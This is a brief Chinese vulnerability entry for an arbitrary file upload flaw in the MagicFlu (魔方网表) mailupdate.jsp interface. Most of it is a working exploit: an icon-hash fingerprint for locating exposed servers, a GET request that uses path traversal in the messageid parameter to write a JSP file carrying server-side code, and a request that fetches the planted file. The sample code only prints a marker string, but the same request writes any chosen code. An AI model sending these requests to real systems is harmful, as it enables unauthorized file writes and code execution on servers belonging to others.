# 魔方网表mailupdate接口存在任意文件上传漏洞

- **系统**：魔方网表mailupdate接口　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash="694014318"`
- **请求**：`GET /magicflu/html/mail/mailupdate.jsp?messageid=/../../../test1.jsp&messagecontent=%3C%25+out.println%28%22tteesstt1%22%29%3B%25%3E HTTP/1.1`

**请求体 / payload**
```

文件上传位置
GET /magicflu/test1.jsp HTTP/1.1
Host:
```

**其他**
- 魔方网表mailupdate接口存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 魔方网表